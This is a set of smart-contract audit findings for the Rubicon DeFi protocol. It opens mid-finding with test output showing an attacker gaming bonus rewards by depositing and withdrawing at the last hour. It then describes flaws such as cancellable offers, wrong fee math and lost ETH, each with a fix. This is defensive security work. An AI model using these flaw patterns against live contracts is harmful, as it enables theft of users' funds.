BathBuddy Vesting Wallet Charles has 8500 bathWETH token, 0 DAI, 0 WETH Charles withdraw all his bathWETH tokens 997.338978147402060445 DAI has been released from BathBuddy Vesting Wallet Charles has 0 bathWETH token, 997.039776453957839827 DAI, 8497.45 WETH Alice has 5 bathWETH token, 0 DAI, 0 WETH 998.075233164534207763 DAI has been released from BathBuddy Vesting Wallet Alice has 0 bathWETH token, 0.736034140627007674 DAI, 6.2731175 WETH       ✓ Add Rewards (100 DAI) to BathBuddy Vesting Wallet  (749ms) bathAssetInstance: underlyingBalance() = 6.2768825 WETH, balanceOf = 6.2768825 WETH, Outstanding Amount = 0 WETH       ✓ [Debug] ```  Attacker Charles deposited 8500 WETH to the pool and withdraw them immediately at the final hour, and obtained almost all of the `bonusTokens` (997 DAI). When Alice withdraw from the pool, she only received 0.7 DAI as `bonusTokens`.  Script can be found [https://gist.github.com/xiaoming9090/2252f6b6f7e62fca20ecfbaac6f754f5](https://gist.github.com/xiaoming9090/2252f6b6f7e62fca20ecfbaac6f754f5)  Note: Due to some unknown issue with the testing environment, please create a new `BathBuddy.released2` functions to fetch the amount of token already released.  ## Impact  Loss of Fund for the users. BathToken LPs not able to receive the accured `bonusToken` that they are entitled to.  ## Recommended Mitigation Steps  Update the reward mechanism to ensure that the `bonusTokens` are distribute fairly and rewards of each user are accured correctly.  In the above example, since Alice hold 50% of the shares in the pool throughout the majority of the reward period, she should be entitled to close to 50% to the rewards/bonus. Anyone who join the pool at the last hour of the reward period should only be entitled dust amount of `bonusToken`.  Additionally, "spot" (or current) share of the pool should not be used to determine the amount of `bonusToken` a user is entitled to as it is vulnerable to pool/share manipulation or flash-loan attack. Checkpointing mechanism should be implemented so that at the minimum, the user's amount of share in the previous block is used for determining the rewards. This make flash-loan attack infeasible as such attack has to happen within the same block/transaction.  For distributing bonus/rewards, I would suggest checking out a widely referenced [Synthetix's Reward](https://github.com/Synthetixio/synthetix/blob/develop/contracts/StakingRewards.sol) Contract as I think that it would be more relevant than OZ's Vesting Wallet for this particular purpose.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629   # Vulnerability details  ## Background  BathBuddy is a Vesting Wallet that payout withdrawers any `bonusTokens` they may have accrued while staking in the Bath Token (e.g. network incentives/governance tokens).  BathBuddy Vesting Wallet releases a user their relative share of the pool’s total vested bonus token during the withdraw call on BathToken.sol. This vesting occurs linearly over Unix time.  It was observed that the BathToken LPs are unable to receive any bonus tokens from the BathBuddy Vesting Wallet during withdraw and the bonus tokens are struck in the BathBuddy Vesting Wallet.  ## Proof-of-Concept  The following shows that the address of the BathBuddy Vesting Wallet is stored in the `rewardsVestingWallet` state variable and it is used to call the `release` function to distribute bonus to the BathToken withdrawers.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629)  ```solidity function distributeBonusTokenRewards(     address receiver,     uint256 sharesWithdrawn,     uint256 initialTotalSupply ) internal {     if (bonusTokens.length > 0) {         for (uint256 index = 0; index < bonusTokens.length; index++) {             IERC20 token = IERC20(bonusTokens[index]);             // Note: Shares already burned in Bath Token _withdraw              // Pair each bonus token with a lightly adapted OZ Vesting wallet. Each time a user withdraws, they             //  are released their relative share of this pool, of vested BathBuddy rewards             // The BathBuddy pool should accrue ERC-20 rewards just like OZ VestingWallet and simply just release the withdrawer's relative share of releaseable() tokens             if (rewardsVestingWallet != IBathBuddy(0)) {                 rewardsVestingWallet.release(                     (token),                     receiver,                     sharesWithdrawn,                     initialTotalSupply,                     feeBPS                 );             }         }     } } ```  However, there is no setter method to initialise the value of the `rewardsVestingWallet` state variable in the contracts. Therefore, the value of `rewardsVestingWallet` will always be zero. Note that Solidity only create a default getter for public state variable, but does not create a default setter.  Since `rewardsVestingWallet` is always zero, the condition `if (rewardsVestingWallet != IBathBuddy(0))` will always be evaluated as `false`. Thus, the code block `rewardsVestingWallet.release` will never be reached.  ## Impact  Loss of Fund for the users. BathToken LPs are not able to receive their `bonusToken`.  ## Recommended Mitigation Steps  Implement a setter method for the `rewardsVestingWallet` state variable in the contracts so that it can be initialised with BathBuddy Vesting Wallet address.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L229:#L244   # Vulnerability details  When swapping amongst multiple pairs in RubiconRouter's `_swap`, the fee is wrongly accounted for.  ## Impact Not all of the user's funds would be forwarded to RubinconMarket, therefore the user would lose funds.  ## Proof of Concept The `_swap` function is calculating the pay amount to send to RubiconMarket.sellAllAmount [to be](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L232): ``` currentAmount.sub(currentAmount.mul(expectedMarketFeeBPS).div(10000) ``` But this would lead to not all of the funds being pulled by RubiconMarket. I mathematically show this in [this image](https://i.ibb.co/J5678C3/c4amountlost.jpg). The correct parameter that needs to be sent to sellAllAmount is: ``` currentAmount.sub(currentAmount.mul(expectedMarketFeeBPS).div(10000+expectedMarketFeeBPS) ``` I mathematically prove this in [this image](https://i.ibb.co/xHzYfzF/c4newparam.jpg).  ## Recommended Mitigation Steps Change the parameter to the abovementioned one.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L180 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L157 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L256   # Vulnerability details  When using the approval mechanism in USDT, the approval must be set to 0 before it is updated. In Rubicon, when creating a pair, the paired asset's approval is not set to 0 before it is updated.  ## Impact Can't create pairs with USDT, the most popular stablecoin, as as the approval will revert.  ## Proof of Concept [USDT](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code) reverts on approval if previous allowance is not 0: ``` require(!((_value != 0) && (allowed[msg.sender][_spender] != 0))); ``` When creating a pair, Rubicon [approves](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L180) the paired asset without first setting it to 0: ``` desiredPairedAsset.approve(pairedPool, initialLiquidityExistingBathToken); ``` Therefore, if desiredPairedAsset is USDT, the function will revert, and pairs with USDT can not be created.  This problem will also manifest in RubiconMarket's [approval function](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L157) and BathToken's [approval function](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L256),   ## Recommended Mitigation Steps Set the allowance to 0 before setting it to the new value.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L356 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L374 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L434 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L451 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L491 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L548   # Vulnerability details  ## Impact When transferring ETH, use `call()` instead of `transfer()`.  The `transfer()` function only allows the recipient to use 2300 gas. If the recipient uses more than that, transfers will fail. In the future gas costs might change increasing the likelihood of that happening.  Keep in mind that `call()` introduces the risk of reentrancy. But, as long as the router follows the checks effects interactions pattern it should be fine. It's not supposed to hold any tokens anyway.  ## Proof of Concept See the linked code snippets above.  ## Tools Used none  ## Recommended Mitigation Steps Replace `transfer()` calls with `call()`. Keep in mind to check whether the call was successful by validating the return value:  ```sol (bool success, ) = msg.sender.call{value: amount}(""); require(success, "Transfer failed.") ```  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/peripheral_contracts/BathBuddy.sol#L69   # Vulnerability details  ## Impact The BathBuddy contract is able to receive ETH. But, there's no way of ever retrieving that ETH from the contract. The funds will be locked up.  Currently, there seems to be no logic in the protocol where ETH is sent to the contract. But, it might happen in the future. So I'd say it's a MED issue.  ## Proof of Concept `receive()`  function: https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/peripheral_contracts/BathBuddy.sol#L69  ## Tools Used none  ## Recommended Mitigation Steps Remove the `receive()` function if the contract isn't supposed to handle ETH. Otherwise, add the necessary logic to release the ETH it gets.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L448-L449 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L525-L535   # Vulnerability details  ## Impact  For upgradeable contracts, there must be storage gap to "allow developers to freely add new state variables in the future without compromising the storage compatibility with existing deployments". Otherwise it may be very difficult to write new implementation code. Without storage gap, the variable in child contract might be overwritten by the upgraded base contract if new variables are added to the base contract. This could have unintended and very serious consequences to the child contracts.  Refer to the bottom part of this article: https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable  ## Proof of Concept  As an example, the `ExpiringMarket` contract inherits `SimpleMarket`, and the `SimpleMarket` contract does not contain any storage gap. If in a future upgrade, an additional variable is added to the `SimpleMarket` contract, that new variable will overwrite the storage slot of the `stopped` variable in the `ExpiringMarket` contract, causing unintended consequences.   https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L448-L449  Similarly, the `ExpiringMarket` does not contain any storage gap either, and the `RubiconMarket` contract inherits `ExpiringMarket`. If a new variable is added to the `ExpiringMarket` contract in an upgrade, that variable will overwrite the `buyEnabled` variable in `ExpiringMarket` contract.   ## Tools Used  Manual review  ## Recommended Mitigation Steps  Recommend adding appropriate storage gap at the end of upgradeable contracts such as the below. Please reference OpenZeppelin upgradeable contract templates.  ```solidity uint256[50] private __gap; ```  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/521d50b22b41b1f52ff9a67ea68ed8012c618da9/contracts/rubiconPools/BathToken.sol#L199-L210   # Vulnerability details  ## Impact The `DOMAIN_SEPARATOR` is wrong calculated.  ## Proof of Concept  In the `initialize` method of the `BathToken` contract, the `name` of the contract is used to calculate the `DOMAIN_SEPARATOR`, however said name is set later, so it will use an incorrect `name`, making it impossible to calculate the `DOMAIN_SEPARATOR` correctly.  ```javascript DOMAIN_SEPARATOR = keccak256(     abi.encode(         keccak256(             "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"         ),         keccak256(bytes(name)),         keccak256(bytes("1")),         chainId,         address(this)     ) ); name = string(abi.encodePacked(_symbol, (" v1"))); ```  Affected source code: - [BathToken.sol#L199-L210](https://github.com/code-423n4/2022-05-rubicon/blob/521d50b22b41b1f52ff9a67ea68ed8012c618da9/contracts/rubiconPools/BathToken.sol#L199-L210)  ## Recommended Mitigation Steps - Set the `name` before use it.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L383-L409   # Vulnerability details  ## Impact When a user creates an offer through the offerWithETH function of the RubiconRouter contract, the offer function of the RubiconMarket contract is called, and the RubiconRouter contract address is set to offer.owner in the offer function. This means that anyone can call the cancelForETH function of the RubiconRouter contract to cancel the offer and get the ether. ## Proof of Concept https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L383-L409 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L440-L452 ## Tools Used None ## Recommended Mitigation Steps Set the owner of offer_id to msg.sender in offerWithETH function and check it in cancelForETH function  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L325-L339   # Vulnerability details  ## Impact In  swapWithETH/buyAllAmountWithETH/offerWithETH/depositWithETH functions of the RubiconRouter contract, when msg.value > max_fill_withFee/pay_amt/amount/amtWithFee, the excess ether will not be returned to the user.  ## Proof of Concept https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L325-L339 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L383-L393 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L455-L462 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L494-L507 ## Tools Used None ## Recommended Mitigation Steps Return excess ether to msg.sender, or require msg.value == max_fill_withFee/pay_amt/amount/amtWithFee  
